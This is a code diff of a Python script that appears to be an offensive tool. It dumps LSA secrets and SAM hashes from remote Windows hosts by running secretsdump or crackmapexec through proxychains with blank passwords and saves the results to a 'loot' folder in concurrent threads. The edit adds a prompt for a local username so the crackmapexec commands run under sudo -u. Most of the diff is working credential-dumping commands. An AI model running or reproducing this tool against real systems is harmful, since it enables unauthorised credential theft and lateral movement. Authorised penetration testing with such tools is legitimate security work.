@@ -58,16 +58,15 @@ def config_check():
     print('\n{}[{}Config looks good{}]{}'.format(color_BLU, color_reset, color_BLU, color_reset))
 
 
-def mt_execute(username, ip, method, secretsdump_path):
+def mt_execute(username, ip, method, secretsdump_path, local_uname):
 
     print('{} Dumping {} via user {}'.format(gold_plus, ip, username))
 
     if method == 'secretsdump':
         os.system('sudo proxychains python3 {} {}:\'\'@{} -no-pass -outputfile \'{}/loot/{}\''.format(secretsdump_path, username, ip, cwd, ip))
     elif method == 'crackmapexec':
-        print(('proxychains crackmapexec smb {} -u {} -p \'\' -d {} --lsa'.format(ip, username.split('/')[1], username.split('/')[0])))
-        os.system('proxychains crackmapexec smb {} -u {} -p \'\' -d {} --lsa'.format(ip, username.split('/')[1], username.split('/')[0]))
-        os.system('proxychains crackmapexec smb {} -u {} -p \'\' -d {} --sam'.format(ip, username.split('/')[1], username.split('/')[0]))
+        os.system('sudo -u {} proxychains crackmapexec smb {} -u {} -p \'\' -d {} --lsa'.format(local_uname, ip, username.split('/')[1], username.split('/')[0]))
+        os.system('sudo -u {} proxychains crackmapexec smb {} -u {} -p \'\' -d {} --sam'.format(local_uname, ip, username.split('/')[1], username.split('/')[0]))
 
     with open('dumped_ips', 'a') as f:
         f.write(ip + '\n')
@@ -95,6 +94,9 @@ if __name__ == '__main__':
         os.makedirs("{}/loot".format(cwd))
 
     config_check()
+    local_uname = ''
+    if options.method == 'crackmapexec':
+        local_uname = input('Enter your username: ')
 
     if options.method == 'secretsdump' and os.path.isfile(options.sdp) == False:
         print('Missing secretsdump.py')
@@ -140,7 +142,7 @@ if __name__ == '__main__':
 
                             # lsa secrets and sam dump courtesy of secretsdump
                             try:
-                                executor.submit(mt_execute, dat[2], dat[1], options.method, options.sdp)
+                                executor.submit(mt_execute, dat[2], dat[1], options.method, options.sdp, local_uname)
                             except Exception as e:
                                 print(str(e))
                                 print('Error dumping secrets')
